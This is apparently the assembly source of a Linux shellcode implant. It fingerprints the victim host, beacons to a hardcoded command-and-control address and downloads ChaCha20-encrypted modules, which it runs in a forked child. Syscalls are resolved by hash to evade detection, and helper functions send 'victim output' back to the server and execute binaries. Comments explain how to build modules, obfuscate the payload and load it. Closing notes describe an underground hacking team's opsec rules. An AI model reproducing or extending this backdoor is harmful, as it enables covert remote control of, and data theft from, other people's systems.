;THIS IS VERSION 0.1 (1 > 0.x V are test versions but can be used in real world)
[BITS 64]

IP1 equ 192 ;0xa0000014
IP2 equ 168;0xe800
IP3 equ 240;0x6b80000
IP4 equ -186;0x80000031 ;ip shuld be 4  part IP1 IP2 IP3 IP4 and ip4 shuld be ip4 = ip4-ip1 127.0.0.1 shuld be 127.0.0.-126 this dinamicaly clculate at runtime
PORT equ 0x5000
base_adress equ here - _entry

_entry:

	call here ;input come from rax it is base adress
here:
	pop rax
	sub rax,base_adress
crate_func_table:
	mov qword[rel api_table],rax

unique_id:
	mov     rax, 63          ; SYS_uname
    lea     rdi, [rel uts]
    syscall
	test rax,rax
	jnz exit

    ; hostname (uts.nodename is at offset 65 in utsname struct)
    lea     rsi, [uts + 65]  ; pointer to nodename string
    mov     rcx, 32          ; copy up to 32 chars
    xor     rbx, rbx
.hash_hostname:
    mov     al,sil
    test    al, al
    jz      .done_hash
    ror     rbx, 5
    xor     bl, al
    inc     rsi
    loop    .hash_hostname
.done_hash:

    ; === statfs(2) on "/" ===
    mov     rax, 137         ; SYS_statfs
    lea     rdi, [rel path]  ; path = "/"
    lea     rsi, [rel fsinfo]
    syscall
	test rax,rax
	jnz exit

    ; fsid is at offset 8 in struct statfs (two ints, 8 bytes)
	lea rax,[rel fsinfo]
    add rax,8
    xor rbx,rax         ; mix with hostname hash

	mov [rel unID], rbx ;store id


dealy:
	lea rdi, [rel timespec]  ; pointer to timespec
	xor rsi, rsi             ; rem = NULL
	mov rax, 35              ; syscall number for nanosleep
	syscall
	; test rax,rax
	; jnz exit

;This is beconing For C2

    ;creating a socket syscall
    mov rdi,2
    mov rsi,1
    mov rdx,0
    mov r15d,0x3d800000
	call gostGetSyscall ;mov rax,41
    call gostEXESyscall
	test rax,rax
	js dealy
    mov r12,rax ; sockfd is store in r12
	push r12
    ;create adress structer
    sub rsp,0xbe
    mov r9,rsp ;r9 and rsp is the adress_structer pointer
	add rsp, 0xbe

	
	;mov r15d,IP3
	;call gostGetSyscall
	mov byte [r9 + 6], IP3;al
    mov word [r9], 0x02 
    mov word [r9 + 2], PORT ;this is port
	;mov r15d,IP1
	;call gostGetSyscall
	mov r14w,IP1
    mov byte [r9 + 4], IP1;al
    xor r10, r10
    mov qword [r9 + 8], r10
	;mov r15d,IP2
	;call gostGetSyscall
	mov byte [r9 + 5], IP2;al
	;mov r15d,IP4
	;call gostGetSyscall
	mov rax,IP4
	add ax,r14w
	mov byte [r9 + 7], al ;ip shuld be 4  part IP1 IP2 IP3 IP4 and ip4 shuld be ip4 = ip4-ip1 127.0.0.1 shuld be 127.0.0.-126 this dinamicaly clculate at runtime


    ;connect to socket syscall
    pop r12
	mov rdi,r12
    mov rsi,r9
    mov rdx,16
    mov r15d,0x1f800000
	call gostGetSyscall ;mov rax,42
    call gostEXESyscall
	test rax,rax
	js dealy

	

    ;send fuck GET reqest to server syscall
    mov rdi,r12
    lea rsi,[rel http_reqest] ;this is not actualy http it is encrypted garbaged http header
    mov rdx,HTTP_LEN
    xor r10,r10
	xor r9, r9        ; addrlen = 0
	xor r8, r8        ; dest_addr = NULL
    mov r15d,0x7400000
	call gostGetSyscall ;mov rax,44
    call gostEXESyscall
	test rax,rax
	js dealy

    ;damn recive syscall
    mov rdi,r12
    lea rsi,[rel modules];r9
    mov rdx,256
    xor r10,r10
    mov r15d,0x3b80000
	call gostGetSyscall ;mov rax,45
    call gostEXESyscall
	test rax,rax
	js dealy
    mov r13,rax ;r13 is the read buffer size

    ;colse socket connection
    mov rdi,r12
    mov r15d,0xa0000000
	call gostGetSyscall ;mov rax,3
    call gostEXESyscall
	test rax,rax
	js dealy

	;optional
	;lea rsi,[rel modules];optional
	;optional

;check module 
check_module_signatuer:
    cld
    mov r10,rsi
    add r10,128
signatuer_loop: ;Signatuer is that shuld every module have NSLM55IM
    mov rax,[rsi]
    cmp rax,[rel singnatuer]
    je decrypt_module
    inc rsi
    cmp rsi,r10
    jnz signatuer_loop

    jmp dealy


decrypt_module:

    add rsi,8 
    mov r10,rsi ;ignore signater and r10 now pointer to module

	sub r13,8 ;length of the module
    call gostEncrypt
	push r10


	
create_module_child:

    pop rsi ;ignore signater and rsi now pointer to module

    ;duplicate process to make child process using fork
    mov r15d,0x2580
	call gostGetSyscall ;mov eax, 57
    call gostEXESyscall
    test rax, rax
	js exit
    jnz dealy

	lea rax,[rel api_table] ;give api table to module

    jmp rsi; jump in to created child process module /give full control of child to module


exit:
    mov r15d,0x440
	call gostGetSyscall ;mov rax, 60         ; sys_exit syscall number
    xor rdi, rdi        ; exit code 0
    call gostEXESyscall             ; exit program

;==========================================================
; most modules are cuttuff(execute --> exit) modules. none_cuttufe(long live) module are mov a it id into spesific locationn and it will send when beconing to prevent get module agin

times 20 db 0

;=================SHELLCODE_API============
gostGetSyscall:
	push rdx
	push rsi
	push r12
	push r9
	;r15d is hash
	xor r11,r11
	sub r11,1
number_loop:

	inc r11
	push r11
	mov rsi,rsp
_hash:
    xor r9, r9
    xor rbx, rbx
    xor rax,rax
	mov r12,8
loop:
    lodsb
    mov bl, al
    add al, al
    xor al, bl   
    add r9d, eax
    mov cl,bl
    ror r9d, cl
    test r12,r12
	dec r12
    jnz loop
    pop r11
	cmp r9d,r15d
	jnz number_loop
	push r11
	pop rax
	pop r9
	pop r12
	pop rsi
    push rax
    pop rax
	pop rdx
    ret

gostSend:
	;34B
	push rbp
	mov rbp,rsp

	;data comes form rdi,rcx
	push rcx
	push rcx


	mov rsi, rdi
	lea rdi, [rel gostSendBuf+10]
	;mov rcx, rcx
	rep movsb

	lea r10,[rel gostSendBuf]
	pop r13 ;mov r13,rcx
	add r13,10
	call gostEncrypt

	;creating a socket syscall
    mov rdi,2
    mov rsi,1
    mov rdx,0
    mov r15d,0x3d800000
	call gostGetSyscall ;mov rax,41
    call gostEXESyscall
	test rax, rax
	js exit
    mov r12,rax ; sockfd is store in r11

    ;create adress structer
    mov rbx,rsp
    sub rsp,0xbe
    mov r9,rsp ;r9 is the adress_structer pointer
    mov rsp,rbx

    ;mov r15d,IP3
	;call gostGetSyscall
	mov byte [r9 + 6], IP3;al
    mov word [r9], 0x02 
    mov word [r9 + 2], PORT ;this is port
	;mov r15d,IP1
	;call gostGetSyscall
	mov r14w,IP1
    mov byte [r9 + 4], IP1;al
    xor r10, r10
    mov qword [r9 + 8], r10
	;mov r15d,IP2
	;call gostGetSyscall
	mov byte [r9 + 5], IP2;al
	;mov r15d,IP4
	;call gostGetSyscall
	mov rax,IP4
	add ax,r14w
	mov byte [r9 + 7], al ;ip shuld be 4  part IP1 IP2 IP3 IP4 and ip4 shuld be ip4 = ip4-ip1 127.0.0.1 shuld be 127.0.0.-126 this dinamicaly clculate at runtime


    ;connect to socket syscall
    mov rdi,r12
    mov rsi,r9
    mov rdx,16
    mov r15d,0x1f800000
	call gostGetSyscall ;mov rax,42
    call gostEXESyscall
	test rax, rax
	js exit

    ;send fuck POST reqest to server syscall
    mov rdi,r12
    lea rsi,[rel gostSendBuf] ;ths is look loking normal garbeg but server handle carfuly this this is actualy not almos like http just encryption garbage send to server then close tcp socket
    pop rdx;mov rdx,HTTP_LEN
	add rdx,10
    xor r10,r10
	xor r9, r9        ; addrlen = 0
	xor r8, r8        ; dest_addr = NULL
    mov r15d,0x7400000
	call gostGetSyscall ;mov rax,44
    call gostEXESyscall
	test rax, rax
	js exit

    ;colse socket connection
    mov rdi,r12
    mov r15d,0xa0000000
	call gostGetSyscall ;mov rax,3
    call gostEXESyscall
	test rax, rax
	js exit

gostPrint:
	;input is from rdi
	call gostSend ;if you think to get output of a eny module also use gostPrint function it is secuer

gostEXESyscall:
	;40C
	mov r15w,0x0E0F
	mov [rel stub],r15w
	sub WORD [rel stub+1],9
stub:
	db "00"
	mov r15w,0x00
	mov [rel stub],r15w
	ret


gostEncrypt:
	;424
	;r10 is the chyper text
	;r13 is the length
	push rbp
	mov rbp,rsp

	;setup state with key and iv
    lea r8,[rel chacha20_state]
    lea r9,[rel chacha20_key]
    call chacha20_setupkey32
    lea r8,[rel chacha20_state]
    lea r9,[rel chacha20_nonce]
    call chacha20_setupiv

    ;decrypt
    lea r8,[rel chacha20_state]
    mov r9,r10
    mov r10,r10
    mov r11,r13
	push r10
    call chacha20_encrypt
	pop r10
	leave
	ret ;no output same input is the encrypt pointer


gostExecute:
	;r10 is the binary with absulute path
	;r13 is arguments
	;r14 is the out buffer

	lea rdi, [rel pipefd]   ; pointer to int[2]
    mov eax, 22             ; syscall: pipe
    syscall
	test rax, rax
	js exit

	;duplicate process to make child process using fork
    mov r15d,0x2580
	call gostGetSyscall ;mov eax, 57
    call gostEXESyscall
    test rax, rax
	js exit
    je execute_child

	; Close write end
    mov rdi, [rel pipefd+4]
    mov rax, 3
    syscall
	test rax, rax
	js exit

    ; read from pipefd[0] into buffer
    mov rdi, [rel pipefd]
    mov rsi, r14
    mov rdx, 460
    xor eax, eax            ; syscall read
    syscall
	test rax, rax
	js exit

	push rax
    ; Close read end
    mov rdi, [rel pipefd]
    mov rax, 3
    syscall
	test rax, rax
	js exit
	pop rax
	ret

execute_child:
	mov rdi, [rel pipefd]
    mov rax, 3
    syscall
	test rax, rax
	js exit

    ; Step 1: Duplicate write end of pipe (pipefd[1]) to stdout (fd 1)
    mov rdi,[rel pipefd+4]
    mov rsi, 1            ; newfd (destination = stdout)
    mov rax, 33
    syscall
	test rax, rax
	js exit

    ; Close write end: fd[1]
    mov rdi, [rel pipefd+4]
    mov rax, 3
    syscall
	test rax, rax
	js exit

    
    mov rdi, r10               ; Path to 'ls' (rdi)
    mov rsi, r13          ; Arguments to pass (rsi)
    xor rdx, rdx                 ; Environment variables (set to NULL)
    mov rax, 59                  ; syscall number for execve
    syscall
	mov rax, 60     ; syscall: exit
    xor rdi, rdi    ; status = 0
    syscall

;=================SHELLCODE_API============


;=======================DATA==========
singnatuer: db "NSLM55IM",0 ;this is standers signatuer IM mean in memory
path: db "/", 0 ;this is chacha20 encrypted path value dec at runtime use common linux path or what you want
LEN_PATH equ $ - path

uts: times 390 db 0 ; struct utsname (enough space)
fsinfo: times 120 db 0 ; struct statfs (enough space)

http_reqest: db 0xE8, 0xFE, 0xF6, 0x2F, 0xC6, 0xEA, 0x20, 0x4B, 0x52, 0x09, 0xCD, 0xA1, 0x63, 0xF7, 0x94, 0xC8, 0x81
unID: dq 0
HTTP_LEN equ $ - http_reqest

gostSendBuf: 
	db "GET /data="
	times 520 db 0x00;gostsend

timespec:
    dq 30          ; tv_sec = 2 seconds
    dq 000000000  ; tv_nsec = 500,000,000 ns = 0.5 s

api_table:
	dq 0
	dq gostEncrypt
	dq gostExecute
	dq gostGetSyscall
	dq gostEXESyscall
	dq gostPrint
	dq gostSend
;=======================DATA==========

;=================CHACHA20=================
chacha20_QuarterRound:
	; z1
	add eax, ebx
	xor edx, eax
	rol edx, 16

	; z2
	add ecx, edx
	xor ebx, ecx
	rol ebx, 12

	; z3
	add eax, ebx
	xor edx, eax
	rol edx, 8

	; z0
	add ecx, edx
	xor ebx, ecx
	rol ebx, 7

	ret

; This function performs the doubleround function
; It assumes that rdi points to the start of an array of 16 input dwords
; This function modifies rax, rbx, rcx, rdx, rsi
; The results are stored in-place
chacha20_DoubleRound:
	; z0, z4, z8, z12
	mov eax, [rdi+4*0]
	mov ebx, [rdi+4*4]
	mov ecx, [rdi+4*8]
	mov edx, [rdi+4*12]
	call chacha20_QuarterRound
	mov [rdi+4*0], eax
	mov [rdi+4*4], ebx
	mov [rdi+4*8], ecx
	mov [rdi+4*12], edx
	
	; z1, z5, z9, z13
	mov eax, [rdi+4*1]
	mov ebx, [rdi+4*5]
	mov ecx, [rdi+4*9]
	mov edx, [rdi+4*13]
	call chacha20_QuarterRound
	mov [rdi+4*1], eax
	mov [rdi+4*5], ebx
	mov [rdi+4*9], ecx
	mov [rdi+4*13], edx
	
	; z2, z6, z10, z14
	mov eax, [rdi+4*2]
	mov ebx, [rdi+4*6]
	mov ecx, [rdi+4*10]
	mov edx, [rdi+4*14]
	call chacha20_QuarterRound
	mov [rdi+4*2], eax
	mov [rdi+4*6], ebx
	mov [rdi+4*10], ecx
	mov [rdi+4*14], edx
	
	; z3, z7, z11, z15
	mov eax, [rdi+4*3]
	mov ebx, [rdi+4*7]
	mov ecx, [rdi+4*11]
	mov edx, [rdi+4*15]
	call chacha20_QuarterRound
	mov [rdi+4*3], eax
	mov [rdi+4*7], ebx
	mov [rdi+4*11], ecx
	mov [rdi+4*15], edx

	; z0, z5, z10, z15
	mov eax, [rdi+4*0]
	mov ebx, [rdi+4*5]
	mov ecx, [rdi+4*10]
	mov edx, [rdi+4*15]
	call chacha20_QuarterRound
	mov [rdi+4*0], eax
	mov [rdi+4*5], ebx
	mov [rdi+4*10], ecx
	mov [rdi+4*15], edx

	; z1, z6, z11, z12
	mov eax, [rdi+4*1]
	mov ebx, [rdi+4*6]
	mov ecx, [rdi+4*11]
	mov edx, [rdi+4*12]
	call chacha20_QuarterRound
	mov [rdi+4*1], eax
	mov [rdi+4*6], ebx
	mov [rdi+4*11], ecx
	mov [rdi+4*12], edx

	; z2, z7, z8, z13
	mov eax, [rdi+4*2]
	mov ebx, [rdi+4*7]
	mov ecx, [rdi+4*8]
	mov edx, [rdi+4*13]
	call chacha20_QuarterRound
	mov [rdi+4*2], eax
	mov [rdi+4*7], ebx
	mov [rdi+4*8], ecx
	mov [rdi+4*13], edx

	; z3, z4, z9, z14
	mov eax, [rdi+4*3]
	mov ebx, [rdi+4*4]
	mov ecx, [rdi+4*9]
	mov edx, [rdi+4*14]
	call chacha20_QuarterRound
	mov [rdi+4*3], eax
	mov [rdi+4*4], ebx
	mov [rdi+4*9], ecx
	mov [rdi+4*14], edx

	ret

; This function performs the salsa20 hash function
; It assumes that esi points to the start of an array of 16 input dwords,
; that edi points to the start of an array of 16 output dwords and that the output
; dwords are initially a copy of the input dwords
; This function modifies eax, ebx, ecx, edx and uses the stack
; The results are stored in-place, the input dwords are not modified
chacha20_hash:
	push rbp
	
	; Run the double rounds on the output (the copy of inputs)
	push rsi
	mov rbp, 10
.roundLoop: 
	call chacha20_DoubleRound
	dec rbp
	jnz .roundLoop
	pop rsi
	
	; Add back inputs to outputs
	mov rcx, 15
.addLoop: 
	mov edx, [rsi+4*rcx]
	add [rdi+4*rcx], edx
	dec rcx
	jge .addLoop
	
	pop rbp
	ret



; This function performs a salsa20 expansion of a 32-byte key (256 bits)
; Assumes that r8 points to a 32-byte key, and r9 points to a 16-byte nounce
; Assumes that rsi points to the destination buffer
; This function modifies rdi
chacha20_expand32:
	lea rdi, [rel chacha20_sigma]
	
	push rax
	mov eax, [rdi+4*0]
	mov [rsi+4*0], eax
	mov eax, [rdi+4*1]
	mov [rsi+4*5], eax
	mov eax, [rdi+4*2]
	mov [rsi+4*10], eax
	mov eax, [rdi+4*3]
	mov [rsi+4*15], eax
	
	mov eax, [r8+4*0]
	mov [rsi+4*1], eax
	mov eax, [r8+4*1]
	mov [rsi+4*2], eax
	mov eax, [r8+4*2]
	mov [rsi+4*3], eax
	mov eax, [r8+4*3]
	mov [rsi+4*4], eax

	mov eax, [r8+4*4]
	mov [rsi+4*11], eax
	mov eax, [r8+4*5]
	mov [rsi+4*12], eax
	mov eax, [r8+4*6]
	mov [rsi+4*13], eax
	mov eax, [r8+4*7]
	mov [rsi+4*14], eax
	
	mov eax, [r9+4*0]
	mov [rsi+4*6], eax
	mov eax, [r9+4*1]
	mov [rsi+4*7], eax
	mov eax, [r9+4*2]
	mov [rsi+4*8], eax
	mov eax, [r9+4*3]
	mov [rsi+4*9], eax
	pop rax
	
	mov rdi, rsi
	call chacha20_hash
	ret



; This function performs a salsa20 expansion of a 16-byte key (256 bits)
; Assumes that r8 points to a 16-byte key, and r9 points to a 16-byte nounce
; Assumes that rsi points to the destination buffer
; This function modifies rdi and uses the stack
chacha20_expand16:
	add rsp, 64
	lea rdi, [rel chacha20_tau]
	
	push rax
	mov eax, [rdi+4*0]
	mov [rsi+4*0], eax
	mov eax, [rdi+4*1]
	mov [rsi+4*5], eax
	mov eax, [rdi+4*2]
	mov [rsi+4*10], eax
	mov eax, [rdi+4*3]
	mov [rsi+4*15], eax
	
	mov eax, [r8+4*0]
	mov [rsi+4*1], eax
	mov eax, [r8+4*1]
	mov [rsi+4*2], eax
	mov eax, [r8+4*2]
	mov [rsi+4*3], eax
	mov eax, [r8+4*3]
	mov [rsi+4*4], eax

	mov eax, [r8+4*0]
	mov [rsi+4*11], eax
	mov eax, [r8+4*1]
	mov [rsi+4*12], eax
	mov eax, [r8+4*2]
	mov [rsi+4*13], eax
	mov eax, [r8+4*3]
	mov [rsi+4*14], eax
	
	mov eax, [r9+4*0]
	mov [rsi+4*6], eax
	mov eax, [r9+4*1]
	mov [rsi+4*7], eax
	mov eax, [r9+4*2]
	mov [rsi+4*8], eax
	mov eax, [r9+4*3]
	mov [rsi+4*9], eax
	pop rax
	
	mov rdi, rsi
	call chacha20_hash
	ret



; Prepare the cipher's internal state to use the given key
; Assumes that r8 points to the state and r9 points to the key
; The key must have a size of 256 bits
; Returns nothing
chacha20_setupkey32:
	mov rax, r8
	
	lea rcx, [rel chacha20_sigma]
	mov edx, [rcx+4*0]
	mov [rax+4*0], edx
	mov edx, [rcx+4*1]
	mov [rax+4*1], edx
	mov edx, [rcx+4*2]
	mov [rax+4*2], edx
	mov edx, [rcx+4*3]
	mov [rax+4*3], edx
	
	mov rcx, r9
	mov edx, [rcx+4*0]
	mov [rax+4*4], edx
	mov edx, [rcx+4*1]
	mov [rax+4*5], edx
	mov edx, [rcx+4*2]
	mov [rax+4*6], edx
	mov edx, [rcx+4*3]
	mov [rax+4*7], edx
	mov edx, [rcx+4*4]
	mov [rax+4*8], edx
	mov edx, [rcx+4*5]
	mov [rax+4*9], edx
	mov edx, [rcx+4*6]
	mov [rax+4*10], edx
	mov edx, [rcx+4*7]
	mov [rax+4*11], edx
	ret



; Prepare the cipher's internal state to use the given key
; Assumes that r8 points to the state and r9 points to the key
; The key must have a size of 128 bits
; Returns nothing
chacha20_setupkey16:
	mov rax, r8
	
	lea rcx, [rel chacha20_tau]
	mov edx, [rcx+4*0]
	mov [rax+4*0], edx
	mov edx, [rcx+4*1]
	mov [rax+4*1], edx
	mov edx, [rcx+4*2]
	mov [rax+4*2], edx
	mov edx, [rcx+4*3]
	mov [rax+4*3], edx
	
	mov rcx, r9
	mov edx, [rcx+4*0]
	mov [rax+4*4], edx
	mov edx, [rcx+4*1]
	mov [rax+4*5], edx
	mov edx, [rcx+4*2]
	mov [rax+4*6], edx
	mov edx, [rcx+4*3]
	mov [rax+4*7], edx
	mov edx, [rcx+4*0]
	mov [rax+4*8], edx
	mov edx, [rcx+4*1]
	mov [rax+4*9], edx
	mov edx, [rcx+4*2]
	mov [rax+4*10], edx
	mov edx, [rcx+4*3]
	mov [rax+4*11], edx
	ret



; Prepare the cipher's internal state to use the given IV
; Assumes that r8 points to the state and r9 points to the iv
; The iv must have a size of at least 32 bits
; Returns nothing
chacha20_setupiv:
	mov rax, r8
	mov rdx, r9
	mov ecx, [rdx+4*0]
	mov [rax+4*12], ecx
	mov ecx, [rdx+4*1]
	mov [rax+4*13], ecx
	xor rcx,rcx
	mov [rax+4*14], ecx
	mov [rax+4*15], ecx
	ret



; Prepare the cipher's internal state to use the given IV fully
; Assumes that r8 points to the state and r9 points to the iv
; The iv must have a size of 64 bits
; Returns nothing
chacha20_setupivfull:
	mov rax, r8
	mov rdx, r9
	mov ecx, [rdx+4*0]
	mov [rax+4*12], ecx
	mov ecx, [rdx+4*1]
	mov [rax+4*13], ecx
	mov ecx, [rdx+4*2]
	mov [rax+4*14], ecx
	mov ecx, [rdx+4*3]
	mov [rax+4*15], ecx
	ret



; Encrypts the plaintext m with the given internal state
; Assumes that r8 points to the state, r9 points to the msg, 
; r10 to the ciphertext, and r11 to the message size
; This function assumes that the state is valid, use setupkey and setupiv first
; Outputs the cyphertext to c
; Returns nothing
chacha20_encrypt:
	; NASM can't declare local arrays, so we'll play with rbp manually ...
	; I hate NASM. So much.
	;%local j[16]:dword, x[16]:dword, tmp[64]:byte, ctarget:ptr
	push rbp
	mov rbp, rsp
	sub rsp, 16*4 ; j
	sub rsp, 16*4 ; x
	sub rsp, 64 ; tmp
	mov rax, r11
	test rax, rax
	jz done
	push rsi
	push rdi
	push rbx
	
	; Prepare j
	mov rax, r8
	mov rbx, rbp
	sub rbx, 16*4
	mov rcx, 15
.jloop:
	mov edx, [rax+4*rcx]
	mov [rbx+4*rcx], edx
	dec rcx
	jge .jloop
	
	; Main loop
.mainLoop:
	; Use our tmp buffer if less than 64B is left
	cmp r11, 64
	jge .dontUseTmp
		mov rbx, r9
		mov rcx, r11
		dec rcx
		mov rdx, rbp
		sub rdx, (16*4)+(16*4)+64
		.tmploop:
		mov al, byte [rbx+rcx]
		mov [rdx+rcx], al
		dec rcx
		jge .tmploop
		mov r9, rdx
		mov rax, r10
		mov r12, rax
		mov r10, rdx
	.dontUseTmp:
	
	; Prepare x
	mov rax, rbp
	sub rax, 16*4
	mov rbx, rbp
	sub rbx, (16*4)+(16*4)
	mov rcx, 15
.xloop: 
	mov edx, [rax+4*rcx]
	mov [rbx+4*rcx], edx
	dec rcx
	jge .xloop
	
	; Compute hash & xor
	mov rsi, rbp
	sub rsi, 16*4
	mov rdi, rbp
	sub rdi, (16*4)+(16*4)
	call chacha20_hash
	mov rax, r9
	mov rcx, 15
.hashloop: 
	mov edx, [rax+4*rcx]
	xor [rdi+4*rcx], edx
	dec rcx
	jge .hashloop
	
	; Increment the nonce
	sub rbp, 16*4
	inc qword [rbp+4*12]
	mov rax, [rbp+4*12]
	test rax, rax
	jnz .noNoneOverflow
		inc qword [rbp+4*14]
	.noNoneOverflow:
	add rbp, 16*4
	
	; Write the ciphertext
	mov rax, rbp
	sub rax, 16*4+16*4
	mov rbx, r10
	mov rcx, 15
.cipherloop: 
	mov edx, [rax+4*rcx]
	mov [rbx+4*rcx], edx
	dec rcx
	jge .cipherloop
	
	; The last block is handled differently
	mov rax, r11
	cmp rax, 64
	jg .noLastBE
		jge .noLastB
			; We're using the tmp buffer, need to copy to ctarget
			mov rax, r10
			mov rbx, r12
			mov rcx, r11
			dec rcx
			.copyloop: 
			mov dl, [rax+rcx]
			mov [rbx+rcx], dl
			dec rcx
			jge .copyloop
		.noLastB:
		mov rdx, r8
		sub rbp, 16*4
		mov rax, [rbp+4*12]
		mov [rdx+4*14], rax
		mov rax, [rbp+4*14]
		mov [rdx+4*15], rax
		add rbp, 16*4
		jmp cleanup
	.noLastBE:
	
	sub r11, 64
	add r10, 64
	add r9, 64
	jmp .mainLoop
	
cleanup:
	pop rbx
	pop rdi
	pop rsi
done:
	add rsp, 64
	add rsp, 16*4
	add rsp, 16*4
	pop rbp
	ret



; Decrypts the cyphertext c with the given internal state
; Assumes that r8 points to the state, r9 points to the msg, 
; r10 to the ciphertext, and r11 to the message size
; Outputs the plaintext to m
; Returns nothing
chacha20_decrypt:
	call chacha20_encrypt
	ret
;==========================================

pipefd: times 8 db 0
chacha20_key: db 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
chacha20_nonce: db 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x4A, 0x00, 0x00, 0x00, 0x00

chacha20_sigma: db 0x65, 0x78, 0x70, 0x61, 0x6E, 0x64, 0x20, 0x33
chacha20_tau: db 0x32, 0x2D, 0x62, 0x79, 0x74, 0x65, 0x20, 0x6B

chacha20_state:
    times 64 db 0

modules:
    times 512 db 0

event_buffer: times 128 db 0


;modulo base 97E

;HOW DO I MAKE MODULES FOR THIS (< 512b)

;this is proved a function remember this is version 0.1 still test stage it mean only few functions
;every function have MBA(module base adress) it mean if adress is function adress is -5
;you can aceess it from your module start rip-5


;gostPrint(&message,len):0xFFFFF9CD this is printf but print victim output on server

;gostGetSyscall(syscallhash):0xFFFFF95A you dont need to do mov rax,syscallnumber alway use this

;gostEXESyscall():0xFFFFFA8E you dont need to hardcode syscall instruction just call gostEXESyscall()

;gostEncrypt(&buffer,len):0xFFFFFAA6 you can encrypt eny memory value inside victime memory

;WARNING: gostPrint() is internely encrypt data you can pass unencrypted string

;after compiled binary sing with signatuer or turn on dinamicaly sign on server.exe


;HOW DO I USE THIS

;Tool-> obufcater.exe/obufcater (this binary is obufcater this provided with pakage)
;Tool-> hash.exe/hash (this is for calulate syscall number hashes)
;server-> server.exe (this is not developed yet but have a minimum version that host mimimum modul)

;nasm -f bin -o obfShellcode.bin obfShellcode.asm
;obufcater.exe
;now shellcode is ready 

;WARNING: you need a loader to load this shellcode









	
; This is underground research/hacking (malware, CVEs, exploits) team

; rolese are not a constent one one use can hanlde multyple role and they can chage role base on project and behavier
; roles:
; 🧠 Lead Strategist (you)

; 👨‍💻 Exploit Developer

; 🧑‍🔬 Reverse Engineer

; 📡 Recon Specialist

; 🧰 Infrastructure/Tool Dev

; 🕵️‍♂️ Opsec/Privacy Lead
; ;i will add more lole later

; 📁 Module 1: Identity and Communication
; Use codenames (never real names)

; Use secure channels (Matrix, Signal, XMPP + OMEMO)

; Shared codewords for ops

; Define ping windows (availability schedules)

; Set comms protocols (how to respond to breach, silent periods)

; 📁 Module 2: Tooling & Workflow
; Decide what stack/tools are standard:

; OS: Kali, Parrot, Arch, windows or what you most familiyer

; Reversing: Ghidra, IDA, Radare2 or what you most familiyer

; Version control: Git, private Gitea

; CI/CD for exploits/tools testing

; 📁 Module 3: Documentation Rules
; Use central markdown format (like:

; markdown
; Copy
; Edit
; # Exploit - CVE-2025-XXXX
; - Target: Redis 6.0
; - Entry Vector: SSRF
; - Payload: Reverse shell -> msfvenom
; - Bypass: WAF + rate-limit
; Keep structured logs per operation

; Store all docs in encrypted vaults (Veracrypt, Cryptomator)

; 📁 Module 4: Opsec Protocol
; Anonymity guides for all members

; VPN, Tor, Whonix, Tails, burner boxes

; Hardware isolation rules

; Airgap labs setup

; No linking real ID, emails, habits

; 📁 Module 5: Task & Project Management
; Create workflow rules:

; Project = op (target, bug bounty, research)

; Assign tasks with deadlines

; Use tools like Forgejo, Kanboard, Trello (self-hosted)

